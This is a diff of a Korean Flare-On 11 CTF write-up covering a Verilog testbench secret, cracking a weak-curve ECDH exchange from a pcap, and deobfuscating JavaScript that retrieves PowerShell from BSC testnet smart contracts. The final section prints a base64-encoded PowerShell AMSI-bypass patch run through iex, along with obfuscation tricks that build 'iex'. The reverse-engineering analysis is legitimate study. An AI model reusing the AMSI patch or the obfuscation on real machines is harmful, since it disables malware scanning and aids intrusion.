@@ -11,15 +11,16 @@ ctf_date: 2024-10-27
 probs:
   - [bloke2, 6, Reversing, Verilog]
   - [fullspeed, 7, Reversing, AOT Compiled .NET / Elliptic-curve Diffie–Hellman]
+  - [Clearly Fake, 8, Reversing, Smart Contract / Powershell Deobfuscation]
 ---
 
-[Flare-On 11 Writeup (1-5)](https://blog.jeongramon.dev/2024-12-02-FlareOn_11_Writeup/)에서 이어지는 글이다. 
+[Flare-On 11 Writeup (1-5)](https://blog.jeongramon.dev/2024/2024-12-02-FlareOn_11_Writeup/)에서 이어지는 글이다. 
 
 {% include problems.html probs=page.probs %}
 
 <br />
 
-# bloke2
+# 6. bloke2
 `Verilog` 프로젝트가 제공된다. `Verilog`란 `FPGA(Field-Programmable Gate Array)` 등을 설계하는 데에 사용되는 `HDL`이라고 한다. 아래와 같은 시나리오가 주어졌으며, 숨겨진 비밀 메시지를 찾아야 한다.
 
 > One of our lab researchers has mysteriously disappeared.  He was working on the prototype for a hashing IP block that worked very much like, but not identically to, the common Blake2 hash family.  Last we heard from him, he was working on the testbenches for the unit.  One of his labmates swears she knew of a secret message that could be extracted with the testbenches, but she couldn't quite recall how to trigger it.  Maybe you could help?
@@ -64,9 +65,9 @@ clean:
 	vvp $(VVPFLAGS) $^
 ```
 
- <br />
+<br />
 
- 일반 컴파일 파일을 실행 시에는 특이사항이 없다. 대신 `tests`로 빌드한 경우 다음과 같이 특별한 출력 값을 가진다. 
+컴파일 후 실행 시 특이사항이 없다. 대신 `tests`로 빌드한 경우 다음과 같이 특별한 출력 값을 가진다. 
 
 ![image.png](/assets/img/writeups/202412/6_1.png)
 
@@ -195,46 +196,49 @@ bloke2s uut (
 
 <br />
 
-# fullspeed
+# 7. fullspeed
 
-.NET exe 파일과 pcap 파일이 주어진다. pcap 파일 내에는 192.168.56.103:31337과 패킷 몇 개를 주고받은 기록이 있다.
+.NET exe 파일과 pcap 파일이 주어진다. pcap 파일 내에는 `192.168.56.103:31337`과 패킷 몇 개를 주고받은 기록이 있다.
 
 ## 초기 접근
 
 ### AOT 
 
-닷넷이므로 전용 디컴파일러를 활용하여 간편히 분석하려 하였으나, 오류가 발생하였다. 
+분석 타겟이 닷넷이므로 전용 디컴파일러를 활용하여 분석하려 하였으나, 오류가 발생하였다. 
 
 ![image.png](/assets/img/writeups/202412/7_0.png)
 
 <br />
 
-`PEview`로 실행파일의 구조를 확인하니, `.managed`와 `.hydrated` 섹션을 확인하였다. 이 두 섹션은 `.NET` 파일이 `AOT` 컴파일되었을 때 존재한다.
+`PEview`로 실행파일의 구조를 확인하니, `.managed`와 `.hydrated` 섹션을 확인하였다. 이 두 섹션은 파일이 `AOT` 컴파일되었을 때 존재한다.
 
 ![image.png](/assets/img/writeups/202412/7_1.png)
 
 <br />
 
-우리가 흔히 마주하는 `.NET`은 `JIT` 컴파일 방식으로, 초기 실행 시에 바이트코드를 컴파일하는 과정을 거치는 특징이 있어 `ILspy`와 같은 전용 디컴파일러로 쉽게 해석이 가능하다. 그러나 `AOT` 방식의 경우 이러한 실행 시점의 컴파일이 없어 남아있는 심볼이 적고, 앞서 언급한 닷넷 전용 디컴파일러로는 디컴파일이 어렵다.
+우리가 흔히 마주하는 `.NET`은 `JIT` 컴파일 방식으로, 초기 실행 시에 바이트코드를 컴파일하는 과정을 거치는 특징이 있으며, `ILspy`와 같은 전용 디컴파일러로 쉽게 해석이 가능하다. 그러나 `AOT` 방식의 경우 이러한 실행 시점의 컴파일 과정을 거치지 않아 남아있는 심볼이 적고, 앞서 언급한 닷넷 전용 디컴파일러로 디컴파일이 불가하다.
 
 또한 `IDA`에 `.NET AOT` 관련 시그니처가 없는 듯하다... 그래서 `IDA`로 문제 파일을 열면 아래와 같이 시그니처 하나 없는 척박한 바이너리를 마주하게 된다.
+
 ![image.png](/assets/img/writeups/202412/7_2.png)
 
 <br />
 
 ### BouncyCastle(AOT) FLIRT Signature 생성 / 로드
 
-String Search를 통하여 `exe` 내 [BouncyCastle](https://github.com/bcgit/bc-csharp.git)의 `commit 83ebf4a805... version`을 사용하였음을 알 수 있다. 
+String Search를 통하여 빌드 과정에서 [BouncyCastle](https://github.com/bcgit/bc-csharp.git)의 `commit 83ebf4a805... version`을 포함하였음을 알 수 있다. 
 
 ![image.png](/assets/img/writeups/202412/7_3.png)
 
 <br />
 
-`IDA`에는 바이너리를 분석하여 직접 시그니처를 생성하고, 이를 내가 분석 중인 파일에 로드하는 기능을 제공한다. 이를 `FLIRT Signature`라 부르는데 상세한 방법은 링크를 참조 바란다. 
+`IDA`에는 바이너리를 분석하여 직접 시그니처를 생성하고, 이를 내가 분석 중인 파일에 로드하는 기능을 제공한다. 이를 `FLIRT Signature`라 부르는데 상세한 방법은 링크(작성 중)를 참조 바란다. 
 
-직접 `BouncyCastle`을 `AOT Compile`하고, `FLIRT Signature`를 추출한 다음 문제 파일에 로드하면 일부 시그니처를 복원할 수 있다.
+`BouncyCastle`을 `AOT Compile`하고, `FLIRT Signature`를 추출한 다음 문제 파일에 로드하면 일부 시그니처를 복원할 수 있다.
 
 ![image.png](/assets/img/writeups/202412/7_7.png)
+
+<br />
 
 ## 분석
 
@@ -316,7 +320,8 @@ int __fastcall main_2(int argc, const char **argv, const char **envp)
 
 ### mainlogic()
 
-`pcap` 내용을 봤을 때 예상할 수 있듯, `192.168.56.103:31337`과 패킷을 주고받는 기능을 수행함을 알 수 있다. `decrypt_string`의 결과는 동적 분석을 통해 얻어내었으며, `v4 = sub_7FF6649C4000(IP_PORT, (int)v3, 0, 0x7FFFFFFF, 0);`에서 `rcx->offset` 부분에서 `127.0.0.1`로 패치한 다음 로컬에 서버를 구축하면 원활하게 이후 동적 분석을 시행할 수 있다.
+`pcap` 내용을 봤을 때 예상할 수 있듯, `192.168.56.103:31337`과 패킷을 주고받는 기능을 수행한다. `decrypt_string`의 결과는 동적 분석을 통해 얻어내었다.
+`v4 = sub_7FF6649C4000(IP_PORT, (int)v3, 0, 0x7FFFFFFF, 0);`에서 `rcx->offset` 부분에서 `127.0.0.1`로 패치한 다음, 로컬에 임시 서버를 구축하면 원활한 동적 분석이 가능하다.
 
 ```cpp
 __int64 mainlogic()
@@ -391,7 +396,7 @@ __int64 __fastcall unknown_libname_69(__int64 *a1, __int64 a2)
 
 <br />
 
-찾기 어려운 이유는 런타임 환경에서, 반복문을 돌며 `((void (*)(void))v3)();`으로 여러 함수를 동적 호출하는 과정에 `main_logic_1_0()`이 실행되기 떄문이다. ~~악랄하다~~
+찾기 어려운 이유는, 런타임 환경에서 반복문을 돌며 `((void (*)(void))v3)();`으로 여러 함수를 동적 호출하는 과정에 `main_logic_1_0()`이 실행되기 떄문이다. ~~악랄하다~~
 
 ```cpp
 __int64 __fastcall S_P_CoreLib_System_Runtime_CompilerServices_ClassConstructorRunner__EnsureClassConstructorRun(
@@ -422,7 +427,7 @@ __int64 __fastcall S_P_CoreLib_System_Runtime_CompilerServices_ClassConstructorR
         if ( (v3 & 2) != 0 )
           (*(void (__fastcall **)(_QWORD))(v3 - 2))(*(_QWORD *)(v3 + 6));
         else
-       **   ((void (*)(void))v3)();**
+          ((void (*)(void))v3)();
         _InterlockedOr(v9, 0);
         *a1 = 0LL;
       }
@@ -438,7 +443,7 @@ __int64 __fastcall S_P_CoreLib_System_Runtime_CompilerServices_ClassConstructorR
 
 <br />
 
-아래 코드는 `ECDH` (타원곡선 디피헬만) 상에서 타원 곡선을 정의하는 함수로 볼 수 있다. 타원 곡선 정의에 필요한 모든 변수가 로드된다.
+아래 코드는 ECDH(타원곡선 디피헬만) 상에서 타원 곡선을 정의하는 함수로 볼 수 있다. 타원 곡선 정의에 필요한 모든 변수가 로드된다.
 
 ```cpp
 __int64 mainlogic_1_0()
@@ -482,7 +487,7 @@ __int64 mainlogic_1_0()
 
 ### main_logic_2
 
-앞부분이 타원곡선 디피헬만 곡선 정의와 관련한 부분이고, 동적 분석을 통해 24바이트씩 두 번 전송 및 두 번 수신함을 확인할 수 있다. 수신 전후 `1337...` 을 `XOR` 키로 활용하여 추가적인 암호화를 거친다. XOR만 제외하면 디피 헬만 알고리즘에서 두 사용자가 세션키를 생성하기 위하여, `k_a\*G`와 `k_b\*G` 을 각각 x, y 좌표로 나누어 송수신하는 부분으로 보인다. 이 때 세션키는 `k_a\*k_b\*G`가 된다. 
+동적 분석을 통해 24바이트씩 각각 두 번 씩 패킷을 전송 및 수신함을 확인하였다. main_logic_1에서 ECDH 활용을 위한 곡선 정의가 이루어졌으므로, 이 패킷들은 ECDH 알고리즘 상 세션키를 생성하기 위한 키 교환 과정으로 추측이 가능하다. 이 때 각 사용자 A, B는 `k_a*G`와 `k_b*G` 을 각각 x, y 좌표로 나누어 송수신하고, 결과적으로 세션키는 `k_a*k_b*G`가 된다. ECDH와 별개로 패킷 수신 전후 `1337...` 을 `XOR` 키로 활용하여 추가적인 암호화를 거치고 있다. 
 
 ```cpp
 
@@ -569,7 +574,9 @@ __int64 mainlogic_2()
   v26 = v25;
 ```
 
-단순 ECDH로 세션키가 생성되지는 않고, `SHA512` 연산을 거쳐 그 결과 값을 `key`와 `nonce`로 활용해 `chacha20` 디코딩을 한다. 그리고 그 값이 `verify`이면 인증을 성공한다.
+<br />
+
+ECDH로 생산한 세션키를 즉시 대칭키로 사용하지는 않는다. 세션키에 `SHA512` 연산을 거쳐 그 값을 `chacha20` 암호화의 `key`와 `nonce`로 활용한다. 최초로 `chacha20` 디코딩한 값이 `verify`이면 인증을 성공한다.
 
 ```cpp
   ...
@@ -617,9 +624,13 @@ __int64 mainlogic_2()
 }
 ```
 
+<br />
+
 ## PoC
 
-ECDH의 곡선 및 기준점 설정을 위한 값은 정해져 있지만, 세션키를 생성하기 위한 개인 키는 랜덤 생성되므로, 결국 pcap 파일에서 얻은 키 교환 과정의 값을 이용하여 ECCH 자체를 깨야 한다.
+ECDH의 곡선 및 기준점 설정을 위한 값은 정해져 있지만, 세션키를 생성하기 위한 개인 키는 랜덤 생성된다. 결국 pcap 파일에서 얻은 키교환 패킷을 이용하여 ECDH 자체를 깨야 한다.
+
+<br />
 
 ### 폴링헬만 알고리즘
 
@@ -627,9 +638,9 @@ ECDH의 교환 키를 이용해 개인 키를 크래킹하는 [폴링헬만 알�
 
 ECDH를 타원곡선이라는 ~~잘 모르겠는~~ 개념을 제쳐두고 요약하면, 일반 디피헬만 알고리즘처럼 `kG = x (mod P)` 에서 `k`를 구하는 것이 어렵다는 점에서 기인하는 것이다. 지금 목표도 `k`를 크래킹 하는 것이고...
 
-이 때 `P = (p_1^e_1) \* (p_2^_e2) \* ...`와 같이 소인수 분해해서 표현할 수 있을텐데, 각 `p_n`에 대해서 `kG=x (mod p_n)` 문제를 푸는 건 당연히 더 쉽다! 원 문제를 이러한 작은 소수 `p_n`들에 대한 각각의 `k_n`을 구하는 문제로 치환하면 `k_n`을 구할 수 있을 뿐만 아니라, 중국인의 나머지 정리를 이용하여 `k_n`들을 조합하여 원본 `k`를 구할 수 있다.
+이 때 `P = (p_1^e_1) * (p_2^_e2) * ...`와 같이 소인수 분해해서 표현할 수 있을텐데, 각 `p_n`에 대해서 `kG=x (mod p_n)` 문제를 푸는 건 당연히 더 쉽다!(`p`보다 `p_n`이 훨씬 작으므로) 원 문제를 이러한 작은 소수 `p_n`들에 대한 각각의 `k_n`을 구하는 문제로 치환하면 `k_n`을 구할 수 있을 뿐만 아니라, `k_n`들을 조합하여 원본 `k`를 구할 수 있다. 조합은 중국인의 나머지 정리를 이용한다.
 
-물론 항상 되는거면 ECDH를 상용적으로 사용할 리가 없을 것이고, `문제가 쉬워진다`라는 조건을 만족하는 `K` 값들의 특징이 있는 듯하다. 원리를 알아야 쓸 수 있는 것은 아니므로 더 이상 깊이 파고들지는 않겠다. ~~수학 시간은 여기까지다.~~
+물론 이러한 크래킹이 항상 가능하다면 ECDH가 지금처럼 일반적으로 사용되고 있을 수는 없을 것이다... `문제가 쉬워진다`라는 조건을 만족하는 `P` 값들의 특징이 있다. 그렇지만 결론적으로 이 문제에서는 이러한 조건을 만족하여 위 알고리즘을 활용 가능하다는 점만 언급하고, 더 이상 깊이 파고들지는 않겠다. ~~수학 시간은 여기까지다.~~
 
 ![image.png](/assets/img/okay.jpg)
 
@@ -637,15 +648,15 @@ ECDH를 타원곡선이라는 ~~잘 모르겠는~~ 개념을 제쳐두고 요약
 
 ### 폴링헬만 알고리즘 구현
 
-폴링헬만 알고리즘을 구현한 [sage 소스코드](https://github.com/pwang00/Cryptographic-Attacks/blob/master/Public%20Key/Diffie%20Hellman/pohlig_hellman_EC.sage)를 커스터마이징하였다. [sagemath 설치 방법](https://doc.sagemath.org/html/en/installation/index.html)은 링크를 참조 바란다. 앞서 정적/동적 분석을 통해 타원 곡선 및 기준점 정의 등에 필요한 값을 모두 얻을 수 있음을 보였다. `k_a*G` 등 키교환에 쓰이는 값은 `main_logic_2()`에서 보았듯 송수신한 바이트 배열에 정해진 `xor_key`를 `XOR` 연산하면 얻을 수 있다.(부록 참조)
+폴링헬만 알고리즘을 구현한 [sage 소스코드](https://github.com/pwang00/Cryptographic-Attacks/blob/master/Public%20Key/Diffie%20Hellman/pohlig_hellman_EC.sage)를 발견하여 커스터마이징하였다. [sagemath 설치 방법](https://doc.sagemath.org/html/en/installation/index.html)은 링크를 참조 바란다. 앞서 정적/동적 분석을 통해 타원 곡선 및 기준점 정의 등에 필요한 값을 모두 얻었다. `k_a*G` 등 키교환에 쓰이는 값은 `main_logic_2()`에서 보았듯 송수신한 패킷에 정해진 `xor_key`를 `XOR` 연산하면 얻을 수 있다.(부록 참조)
 
-실행해보면 인수분해를 한 값 중 마지막 소수가 너무 커서 그 부분에서 연산이 멈춘 채로 동작하지를 않는다. 일단 인수분해한 소수 리스트에서 이 큰 소수 1개를 삭제하면 연산을 빠른 시간 내로 마무리할 수 있다.
+폴링헬만 알고리즘 코드를 실행하면, `P`를 인수분해를 하고 각 `p_n`에 대하여 연산을 수행한다. 그러나 이 소수 리스트 중 1개의 값이 너무 커, 컴퓨터가 이 소수와 관련한 연산을 완료하지 못한다.~~적어도 내 컴퓨터는 그렇다.~~ 일단 인수분해한 소수 리스트에서 이 큰 소수 1개를 삭제하면 연산을 빠른 시간 내로 마무리할 수 있다. 물론 마지막 소수에 대한 연산이 이루어지지 않았으므로 얻는 키 값은 약간 틀리다.
 
 ![image.png](/assets/img/writeups/202412/7_8.jpg)
 
 <br />
 
-그리고 얻은 키 값의 배수 중에서 정답 키 값이 존재할 것이므로, 다음과 같이 찾은 키의 배수 중 진짜 키를 찾는 로직을 추가하여 연산을 간소화할 수 있다. `e`가 모두 1이므로 간단히 `prod(factors)`로 m을 만들었다. 풀 코드는 부록 참조.
+얻은 키 값의 배수 중에서 정답 키 값이 존재할 것이므로, 다음과 같이 찾은 키의 배수 중 진짜 키를 찾는 로직을 추가하여 연산을 간소화할 수 있다. `e`가 모두 1이므로 간단히 `prod(factors)`로 `m`을 만들었다. 풀 코드는 부록 참조.
 
 ```python
     m = prod(factors)
@@ -657,11 +668,15 @@ ECDH를 타원곡선이라는 ~~잘 모르겠는~~ 개념을 제쳐두고 요약
     return 
 ```
 
+<br />
+
 해독에 필요한 공유 키는 `k_A * (k_B * G)`, 즉 `K_A *PB`이다!
+
+<br />
 
 ### chacha20 
 
-`pcap` 파일에서 확인했던 암호문들을 모두 `chacha20`으로 해독하면 된다! 앞서 설명하였듯 key, nonce는 공유키의 해시값이다.
+`pcap` 파일 내 암호화된 패킷을 모두 `chacha20`으로 해독하면 된다! 앞서 설명하였듯 key, nonce는 공유키의 해시값이다.
 
 ```python
 def decrypt(shared_key):
@@ -702,10 +717,8 @@ def decrypt(shared_key):
 
 <br />
 
-마지막 부분에 base64로 인코딩된 것을 해석해보면 플래그를 확인할 수 있다.
+해독 결과 중 base64로 인코딩된 것을 디코딩해보면 플래그를 확인할 수 있다.
 `D0nt_U5e_y0ur_Own_CuRv3s@flare-on.com`
-
-![image.png](/assets/img/writeups/202412/7_9.jpg)
 
 <br />
 
@@ -891,9 +904,9 @@ kG = get_kG()
 
 <br />
 
-# clearlyfake
+# 8. Clearly Fake
 
-난독화된 `js`가 주어진다. 난독화를 해제하면 `Binance Smart Chain` 테스트넷에서 특정 스마트 컨트랙트를 호출한다. 스마트 컨트랙트 관련 기초적인 이해만 있으면 문제를 풀 수 있다.
+난독화된 `js`가 주어진다. 난독화를 해제하면 `Binance Smart Chain` 테스트넷에서 특정 스마트 컨트랙트를 호출하는 코드를 확인 가능하다. 스마트 컨트랙트에 대한 기초적인 수준의 이해를 필요로 한다.
 
 <br />
 
@@ -918,7 +931,7 @@ eval(
 ```
 <br />
 
-추가적으로 [de4js](https://lelinhtinh.github.io/de4js/)를 활용하면 `eval`도 깔끔하게 난독화 해제할 수 있다.
+추가적으로 [de4js](https://lelinhtinh.github.io/de4js/)를 활용하면 `eval` 난독화도 깔끔하게 해석할 수 있다.
 
 ```js
 const Web3 = require("web3");
@@ -960,13 +973,13 @@ callContractFunction(inputString);
 
 ### Smart Contract Decompile
 
-Contract Adress가 주어졌으므로 [BSCscan](testnet.bscscan.com)을 이용해 검색한다. 코드에 쓰여있듯 `TESTNET`에 검색해야 한다.
+Contract Address가 주어졌으므로 [BSCscan](https://testnet.bscscan.com)을 이용해 검색한다. 코드에 쓰여있듯 `TESTNET`에 검색해야 한다.
 
 ![image](/assets/img/writeups/202412/8_0.jpg)
 
 <br />
 
-Contract 탭에서 스마트 컨트랙트를 확인하려 했는데 디컴파일이 오류가 났다. OpCode 탭을 보니까 `invalid opcode`가 포함된 것으로 표기된다. 이미 잘 돌아간 스마트 컨트랙트가 컴파일 오류가 났을리 없으므로, `BSCscan` 자체 디컴파일러가 문제가 있는 것으로 결론 내렸다. 그래서 다른른 디컴파일러 [dedaub](https://app.dedaub.com/)를 활용하였더니 디컴파일이 잘 됐다. 
+Contract 탭에서 스마트 컨트랙트를 확인하려 했는데 디컴파일 오류가 발생했다. OpCode 탭을 확인하니 `invalid opcode`가 포함된 것으로 표기된다. 이미 잘 호출된 스마트 컨트랙트가 컴파일 오류가 발생했을 리(invalid opcode가 포함되었을 리) 없으므로, `BSCscan` 자체 디컴파일러가 오류가 있는 것으로 결론 내렸다. 그래서 다른 디컴파일러를 탐색하였고, [dedaub](https://app.dedaub.com/)를 활용하였더니 디컴파일이 잘 이루어졌다. 
 
 ![image](/assets/img/writeups/202412/8_1.jpg)
 
@@ -975,7 +988,7 @@ Contract 탭에서 스마트 컨트랙트를 확인하려 했는데 디컴파일
 ## Smart Contract
 
 ### Contract 0x9223f0...
-주어진 문자열의 첫 자가 0x67, 둘째 자가 0x69 등의 조건을 만족하면 `0x5324eab94b236d4d1456edc574363b113cebf09`를 `return`한다. 
+주어진 문자열의 첫 자가 0x67, 둘째 자가 0x69 등 조건을 만족하면 `0x5324eab94b236d4d1456edc574363b113cebf09`를 `return`한다. 
 
 ```js
 function fallback() public payable { 
@@ -1104,7 +1117,7 @@ function __function_selector__( function_selector) public payable {
 
 <br />
 
-참고로 만족시키는 문자열은 해독해보면 아래 사진과 같다. ~~정답과 관련은 없지만 맞는 방향으로 나아가고 있다는 확신을 준다.~~
+참고로 만족시키는 문자열(0x6769...)은 해독해보면 아래 사진과 같다. ~~정답과 관련은 없지만 맞는 방향으로 나아가고 있다는 확신을 준다.~~
 
 ![image](/assets/img/writeups/202412/8_2.jpg)
 
@@ -1112,7 +1125,7 @@ function __function_selector__( function_selector) public payable {
 
 ### Contract 0x5324ea...
 
-최초 `js`를 다시 살펴보자. 첫번째 스마트 컨트랙트에서 `return`한 문자열을 인자로 다음 스마트 컨트랙트를 호출한다.
+최초 `js`를 다시 살펴보자. 첫번째 스마트 컨트랙트에서 `return`한 문자열을 인자로 다음 스마트 컨트랙트를 호출한다. 그러므로 `return` 받은 `0x5324ea...`를 호출한다.
 
 ```js
 const largeString = web3.eth.abi.decodeParameter("string", result);
@@ -1130,13 +1143,13 @@ const largeString = web3.eth.abi.decodeParameter("string", result);
 
 <br />
 
-`block number`가 주어졌으므로 해당 블록을 [BSCscan](testnet.bscscan.com)에서 확인한다. input data가 존재하는데, 어딜 봐도 `base64`다. 
+`block number`가 주어졌으므로 해당 블록을 [BSCscan](testnet.bscscan.com)에서 확인한다. input data가 존재하는데, `base64` 인코딩 된 것으로 보인인다. 
 
 ![image](/assets/img/writeups/202412/8_3.jpg)
 
 <br />
 
-앞 부분을 조금 지워가며 `base64 decode`를 하면 파워쉘 명령을 얻을 수 있다. `base64` 인코딩된 문자열이 또 보이므로 한번 더 디코딩딩한다.
+앞 부분을 조금 지워가며 `base64` 디코딩을 하면 파워쉘 명령을 얻을 수 있다. `base64` 인코딩된 문자열이 또 보이므로 한번 더 디코딩한다.
 
 ```js
 ø[sYstEm.Text.eNCODinG]::unicodE.getStrinG([sYstEm.cONvErt]::FroMbaSE64stRInG("IwBSAGEAcwB0AGEALQBtAG8AdQBzAGUAcwAgAEEAbQBzAGkALQBTAGMAYQBuAC0AQgB1AGYAZgBlAHIAIABwAGEAdABjAGgAIABcAG4ADQAKACQAZgBoAGYAeQBjACAAPQAgAEAAIgANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABmAGgAZgB5AGMAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAaQB4AGEAagBtAHoALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAAJABmAGgAZgB5AGMADQAKAA0ACgAkAG4AegB3AHQAZwB2AGQAIAA9ACAAWwBmAGgAZgB5AGMAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgAkACgAKAAnAOMAbQBzAO0ALgAnACsAJwBkAGwAbAAnACkALgBOAE8AcgBtAEEAbABpAHoARQAoAFsAYwBIAGEAUgBdACgANwAwACoAMwAxAC8AMwAxACkAKwBbAGMAaABhAHIAXQAoADEAMQAxACkAKwBbAEMAaABhAHIAXQAoAFsAQgB5AHQAZQBdADAAeAA3ADIAKQArAFsAQwBIAGEAUgBdACgAMQAwADkAKwA2ADAALQA2ADAAKQArAFsAQwBoAGEAUgBdACgANQA0ACsAMQA0ACkAKQAgAC0AcgBlAHAAbABhAGMAZQAgAFsAYwBoAGEAUgBdACgAWwBiAFkAVABFAF0AMAB4ADUAYwApACsAWwBDAEgAYQByAF0AKABbAGIAWQBUAEUAXQAwAHgANwAwACkAKwBbAEMAaABBAFIAXQAoADEAMgAzACsAMgAtADIAKQArAFsAQwBIAGEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADQAZAApACsAWwBDAGgAQQBSAF0AKABbAGIAWQBUAEUAXQAwAHgANgBlACkAKwBbAGMAaABhAHIAXQAoAFsAYgB5AFQARQBdADAAeAA3AGQAKQApACIAKQANAAoAJABuAGoAeQB3AGcAbwAgAD0AIABbAGYAaABmAHkAYwBdADoAOgBHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKAAkAG4AegB3AHQAZwB2AGQALAAgACIAJAAoACgAJwDBAG0AcwDsAFMAYwAnACsAJwDkAG4AQgB1AGYAZgAnACsAJwBlAHIAJwApAC4ATgBPAHIAbQBBAEwASQB6AEUAKABbAEMASABhAFIAXQAoAFsAYgBZAFQARQBdADAAeAA0ADYAKQArAFsAQwBoAGEAcgBdACgAWwBiAFkAVABlAF0AMAB4ADYAZgApACsAWwBjAEgAQQByAF0AKABbAGIAWQBUAEUAXQAwAHgANwAyACkAKwBbAEMASABhAHIAXQAoADEAMAA5ACkAKwBbAGMASABhAFIAXQAoAFsAQgB5AFQAZQBdADAAeAA0ADQAKQApACAALQByAGUAcABsAGEAYwBlACAAWwBjAGgAQQBSAF0AKAA5ADIAKQArAFsAQwBoAGEAcgBdACgAWwBiAHkAVABFAF0AMAB4ADcAMAApACsAWwBjAGgAYQBSAF0AKABbAGIAWQBUAEUAXQAwAHgANwBiACkAKwBbAGMAaABhAFIAXQAoAFsAQgBZAHQARQBdADAAeAA0AGQAKQArAFsAYwBoAGEAcgBdACgAMgAxACsAOAA5ACkAKwBbAGMAaABhAFIAXQAoADMAMQArADkANAApACkAIgApAA0ACgAkAHAAIAA9ACAAMAANAAoAWwBmAGgAZgB5AGMAXQA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABuAGoAeQB3AGcAbwAsACAAWwB1AGkAbgB0ADMAMgBdADUALAAgADAAeAA0ADAALAAgAFsAcgBlAGYAXQAkAHAAKQANAAoAJABoAGEAbAB5ACAAPQAgACIAMAB4AEIAOAAiAA0ACgAkAGQAZABuAGcAIAA9ACAAIgAwAHgANQA3ACIADQAKACQAeABkAGUAcQAgAD0AIAAiADAAeAAwADAAIgANAAoAJABtAGIAcgBmACAAPQAgACIAMAB4ADAANwAiAA0ACgAkAGUAdwBhAHEAIAA9ACAAIgAwAHgAOAAwACIADQAKACQAZgBxAHoAdAAgAD0AIAAiADAAeABDADMAIgANAAoAJAB5AGYAbgBqAGIAIAA9ACAAWwBCAHkAdABlAFsAXQBdACAAKAAkAGgAYQBsAHkALAAkAGQAZABuAGcALAAkAHgAZABlAHEALAAkAG0AYgByAGYALAArACQAZQB3AGEAcQAsACsAJABmAHEAegB0ACkADQAKAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAHkAZgBuAGoAYgAsACAAMAAsACAAJABuAGoAeQB3AGcAbwAsACAANgApAA=="))|iex
@@ -1144,7 +1157,7 @@ const largeString = web3.eth.abi.decodeParameter("string", result);
 
 <br />
 
-뭔가 나오긴 했는데 문제와 별 관련이 없어 보인다. ~~놀랍게도 그것은 사실이다.~~ 출제 오류로 flag 관련 부분이 input에 포함되지 않았다고 한다. 출제진이 문제 오류를 패치하여 `block number 44335452`를 추가하였으므로 해당 블록을 보자.
+코드가 나오긴 했지만 문제와 별 관련이 없어 보인다. ~~놀랍게도 그것은 사실이다.~~ 출제 오류로 flag 관련 부분이 input에 포함되지 않았다고 한다. 출제진이 문제 오류를 패치하여 `block number 44335452`를 추가하였으므로 대신 해당 블록을 보자.
 
 ```js
 #Rasta-mouses Amsi-Scan-Buffer patch \n
@@ -1193,7 +1206,7 @@ $yfnjb = [Byte[]] ($haly,$ddng,$xdeq,$mbrf,+$ewaq,+$fqzt)
 
 ## Powershell Deobfuscation
 
-조금 복잡해보이지만, 간추리면 `~~~~~~| &( ([stRing]$VErboSEpRefeReNCe)[1,3]+'X'-joiN'')` 형태이다. `[stRing]$VErboSEpRefeReNCe[1,3] + 'X'`은 `powershell`에 기본적으로 정해져있는 변수로, `"SilentlyContinue" `를 나타낸다. 때문에 결과적으로 `~~~~~|iex`의 형태가 되므로, 앞 `~~~~~`만 powershell로 실행한다.
+조금 복잡해보이지만, 간추리면 `~~~~~~| &( ([stRing]$VErboSEpRefeReNCe)[1,3]+'X'-joiN'')` 형태이다. `VErboSEpRefeReNCe`은 `powershell`에 기본적으로 정해져있는 변수로, `"SilentlyContinue"`를 나타낸다. 때문에 결과적으로 `~~~~~|iex`의 형태가 되므로, 앞 `~~~~~`만 powershell로 실행한다.
 
 ```js
